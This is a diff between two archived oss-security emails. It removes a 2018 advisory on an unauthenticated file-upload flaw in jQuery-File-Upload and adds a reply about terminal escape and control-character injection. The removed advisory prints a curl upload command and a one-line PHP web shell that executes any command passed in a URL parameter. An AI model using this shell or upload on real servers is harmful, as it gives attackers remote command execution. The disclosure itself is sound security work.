@@ -1,57 +1,30 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/14/1
-Message-id: <270DF5EF-8FE1-486A-B15B-BC117769E4D8@me.com>
-Date: Sat, 13 Oct 2018 22:11:41 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Security <oss-security@...ts.openwall.com>
-Subject: Re: jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/04/10/3
+Message-ID: <20180410102403.6gb45xp4kt75ybpj@jwilk.net>
+Date: Tue, 10 Apr 2018 12:24:03 +0200
+From: Jakub Wilk <jwilk@...lk.net>
+To: oss-security@...ts.openwall.com
+Subject: Re: Re: Terminal Control Chars
 Content-Type: text/plain; charset=utf-8
 
-Hello All,
+* Not Real <theborland1@...il.com>, 2018-04-09, 13:35:
+>This is posted here every few months.
 
- 
+The thread subject is not as informative as it could be. The original 
+post was about pasting control characters. While the problem is not 
+new[0], I don't recall it being ever discussed on oss-security before.
 
-This has been fixed in v9.22.1.
+>https://turbochaos.blogspot.com/2014/08/journalctl-terminal-escape-injection.html
 
- 
-
-Larry
-
-From: "Larry W. Cashdollar" <larry0@...com>
-Reply-To: Open Security <oss-security@...ts.openwall.com>
-Date: Thursday, October 11, 2018 at 12:07 PM
-To: Open Security <oss-security@...ts.openwall.com>
-Subject: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
-
- 
-
-Title: jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
-Author: Larry W. Cashdollar, @_larry0
-Date: 2018-10-09
-CVE-ID:[CVE-2018-9206]
-Download Site: https://github.com/blueimp/jQuery-File-Upload/
-Vendor: https://github.com/blueimp
-Vendor Notified: 2018-10-09
-Vendor Contact:
-Advisory: http://www.vapidlabs.com/advisory.php?v=204
-Description: File Upload widget with multiple file selection, drag&drop support, progress bar, validation and preview images, audio and video for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.
-Vulnerability:
-The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't require any validation to upload files to the server. It also doesn't exclude file types. This allows for remote code execution.
+OTOH, this is about terminal escape injection, an entirely different 
+problem, and a frequent topic on oss-security.
 
 
-Exploit Code:
-$ curl -F "files=@...ll.php" http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php
+[0] The original post links to 
+https://thejh.net/misc/website-terminal-copy-paste (from 2013?), 
+which links to 
+http://www.ush.it/team/ascii/hack-tricks_253C_CCC2008/wysinwyc/what_you_see_is_not_what_you_copy.txt 
+(from 2008).
 
-Where shell.php is:
-
-<?php 
-
-$cmd=$_GET['cmd']; 
-
-system($cmd);
-
-?>
-Screen Shots:
-Notes: Actively being exploited in the wild. https://github.com/blueimp/jQuery-File-Upload/pull/3514
-
-
+-- 
+Jakub Wilk
